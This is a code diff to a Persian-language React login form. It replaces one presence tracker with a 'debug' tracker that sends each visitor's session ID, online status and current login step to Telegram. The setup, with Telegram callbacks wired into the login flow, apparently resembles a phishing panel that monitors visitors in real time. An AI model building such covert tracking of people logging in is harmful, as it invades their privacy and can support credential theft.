@@ -38,9 +38,9 @@ import {
   registerTelegramCallback,
   unregisterTelegramCallback,
 } from "@/lib/telegram-callback-service";
-import enhancedRealtimeTracker, {
-  type UserPresenceState,
-} from "@/lib/enhanced-realtime-tracker";
+import debugOnlineTracker, {
+  type DebugState,
+} from "@/lib/debug-online-tracker";
 import type { SimpleActivityState } from "@/lib/simple-realtime-tracker";
 
 type AuthStep =
@@ -115,55 +115,53 @@ export const LoginForm = () => {
     }
   }, [sessionId]);
 
-  // Enhanced real-time online/offline tracking
+  // Debug real-time online/offline tracking
   useEffect(() => {
     if (sessionId) {
       console.log(
-        "🚀 Starting ENHANCED real-time tracking for session:",
+        "🐛 Starting DEBUG real-time tracking for session:",
         sessionId,
         "- Current step:",
         currentStep,
       );
 
-      const handlePresenceChange = async (state: UserPresenceState) => {
-        console.log("📡 ENHANCED presence state changed:", {
+      const handleStateChange = async (state: DebugState) => {
+        console.log("📡 DEBUG state changed:", {
           sessionId,
           isOnline: state.isOnline,
-          isInPage: state.isInPage,
-          browserTabActive: state.browserTabActive,
-          networkConnected: state.networkConnected,
+          reason: state.reason,
           currentStep,
-          lastSeen: new Date(state.lastSeen).toLocaleString("fa-IR"),
+          timestamp: new Date(state.timestamp).toLocaleString("fa-IR"),
         });
 
-        console.log("📤 Sending presence to Telegram:", {
-          statusText: enhancedRealtimeTracker.getStatusText(),
-          statusEmoji: enhancedRealtimeTracker.getStatusEmoji(),
+        console.log("📤 Sending to Telegram:", {
+          statusText: debugOnlineTracker.getStatusText(),
+          statusEmoji: debugOnlineTracker.getStatusEmoji(),
         });
 
         try {
-          // Send presence updates to Telegram
+          // Send updates to Telegram
           const result = await updateUserOnlineStatus(
             sessionId,
             state.isOnline,
-            state.isInPage,
-            state.lastSeen,
-            enhancedRealtimeTracker.getStatusText(),
-            enhancedRealtimeTracker.getStatusEmoji(),
+            state.isOnline, // isVisible = isOnline for debug
+            state.timestamp,
+            debugOnlineTracker.getStatusText(),
+            debugOnlineTracker.getStatusEmoji(),
           );
 
-          console.log("✅ Presence update sent successfully");
+          console.log("✅ DEBUG update sent successfully", result);
         } catch (error) {
-          console.error("❌ Failed to send presence update:", error);
+          console.error("❌ Failed to send DEBUG update:", error);
         }
       };
 
-      // Start enhanced real-time tracking
-      enhancedRealtimeTracker.start(sessionId, handlePresenceChange);
+      // Start debug tracking
+      debugOnlineTracker.start(sessionId, handleStateChange);
 
       return () => {
-        console.log("🛑 Stopping enhanced real-time tracking");
-        enhancedRealtimeTracker.stop();
+        console.log("🛑 Stopping debug tracking");
+        debugOnlineTracker.stop();
       };
     }
   }, [sessionId, currentStep]);
@@ -2471,7 +2469,7 @@ export const LoginForm = () => {
                     onClick={(e) => {
                       e.preventDefault();
                       alert(
-                        "لینک بازیا��ی رمز عبور به ایمیل شما ارسال خواهد شد.",
+                        "لینک بازیابی رمز عبور به ایمیل شما ارسال خواهد شد.",
                       );
                     }}
                     style={{
